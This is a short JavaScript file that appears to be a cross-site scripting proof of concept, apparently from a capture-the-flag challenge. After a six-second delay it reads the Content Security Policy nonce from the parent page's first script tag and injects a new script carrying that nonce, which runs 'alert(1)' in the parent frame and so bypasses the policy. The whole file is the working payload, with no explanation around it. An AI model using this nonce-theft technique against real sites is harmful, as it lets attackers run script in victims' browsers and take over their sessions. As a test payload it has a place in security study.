/**/
console.log("shibli");
setTimeout(() => {
  var nonce = window.parent.document.getElementsByTagName("script")[0].nonce;
  console.log(nonce);
  var x = window.parent.document.createElement("script");
  x.setAttribute("nonce", nonce);
  x.innerHTML="alert(1)";
  window.parent.document.body.appendChild(x);
}, 6000);
